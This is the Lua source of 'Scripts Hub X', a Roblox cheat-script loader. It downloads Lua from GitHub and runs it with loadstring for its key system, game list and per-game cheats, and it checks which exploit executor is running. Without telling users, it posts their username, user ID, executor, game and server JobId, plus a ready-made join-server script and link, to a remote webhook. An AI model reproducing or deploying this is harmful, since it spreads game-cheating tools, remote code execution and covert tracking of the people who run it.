-- Updated Key System Loader for Randomized API
local function loadKeySystem()
	local success, keySystemModule = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load key system: " .. tostring(keySystemModule))
		return false
	end
	
	if type(keySystemModule) ~= "table" then
		warn("Key system returned invalid data type: " .. type(keySystemModule))
		return false
	end
	
	print("Checking for existing valid key...")
	if keySystemModule.CheckExistingKey and keySystemModule.CheckExistingKey() then
		print("Valid key found and verified with API, skipping key system UI")
		return true
	end

	if keySystemModule.ShowKeySystem then
		keySystemModule.ShowKeySystem()
	else
		warn("ShowKeySystem function not found in key system module")
		return false
	end
	
	local maxWait = 300
	local waited = 0
	local lastUpdate = 0
	
	while waited < maxWait do
		if keySystemModule.IsKeyVerified and keySystemModule.IsKeyVerified() then
			print("Key verified successfully with randomized API")
			return true
		end
		
		task.wait(1)
		waited = waited + 1
		
		if waited - lastUpdate >= 30 then
			lastUpdate = waited
			local remainingMinutes = math.ceil((maxWait - waited) / 60)
			print("Key verification timeout in " .. remainingMinutes .. " minutes...")
		end
	end
	
	print("Key verification timeout or failed")
	return false
end

-- ================================
-- REMAINING ORIGINAL FUNCTIONS
-- ================================

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif getgenv and getgenv().scriptware then
		return "Script-Ware"
	elseif getgenv and getgenv().protosmasher then
		return "ProtoSmasher"
	elseif getgenv and getgenv().sirhurt then
		return "SirHurt"
	elseif getgenv and getgenv().sentinellib then
		return "Sentinel"
	elseif getgenv and getgenv().vega then
		return "Vega X"
	elseif getgenv and getgenv().oxygen then
		return "Oxygen U"
	elseif getgenv and getgenv().comet then
		return "Comet"
	elseif getgenv and getgenv().nihon then
		return "Nihon"
	elseif getgenv and getgenv().delta then
		return "Delta"
	elseif getgenv and getgenv().evon then
		return "Evon"
	elseif getgenv and getgenv().electron then
		return "Electron"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local userId = tostring(player.UserId)
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Official - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						{["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)', ["inline"] = true},
						{["name"] = "Join Link", ["value"] = '[Join To The Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		local function makeWebhookRequest()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif syn and syn.request then
				syn.request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			else
				print("No HTTP request function available")
			end
		end
		
		pcall(makeWebhookRequest)
	end)
end

-- Game support check function
local function checkGameSupport()	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data type: " .. type(Games))
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- Game script loading function
local function loadGameScript(scriptUrl)
	local success, result = pcall(function()
		local scriptContent = game:HttpGet(scriptUrl)
		if not scriptContent or scriptContent == "" then
			error("Empty script content received")
		end
		return loadstring(scriptContent)()
	end)
	
	if success then
		print("Game script loaded and executed successfully")
		return true, nil
	else
		print("Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		isPremiumUser = true
		return "owner"
	end
	
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		isPremiumUser = true
		return "staff"
	end
	
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		isPremiumUser = true
		return "premium"
	end
	
	print("Regular user detected - Key system required")
	return "regular"
end

-- ================================
-- MAIN EXECUTION WITH PREMIUM COMMANDS
-- ================================

spawn(function()
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Initialize command system for all users
	createCommandFolder()
	createUserMarker()
	
	-- Wait a bit for other users to register
	task.wait(2)
	scanForScriptsHubXUsers()
	
	-- Start command listener for all users
	startCommandListener()
	
	-- Start chat listener only for premium users
	if isPremiumUser then
		startChatListener()
		print("[SHX] Premium commands enabled")
		notify("Scripts Hub X", "Premium commands system active! Type ;help for commands")
	end
	
	-- Periodic user scan
	task.spawn(function()
		while true do
			task.wait(30)
			scanForScriptsHubXUsers()
		end
	end)
	
	-- Handle key system for non-premium users
	if userStatus == "regular" and Keysystem then
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("Key system failed or timed out")
			notify("Scripts Hub X", "Key verification failed or timed out.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("Key system disabled - Bypassing for regular user")
		userStatus = "regular-bypassed"
	else
		print("Premium/Staff/Owner user - Bypassing key system")
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Handle unsupported games
	if not isSupported then
		notify("Scripts Hub X", "Game is not supported yet.")
		return
	end
	
	-- Load and execute the game script
	print("Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("Scripts Hub X | Complete for " .. userStatus .. " user")
		if isPremiumUser then
			print("[SHX] Premium commands ready. Use ;help in chat for command list")
		end
	else
		print("Script failed to load: " .. tostring(errorMsg))
	end
end)
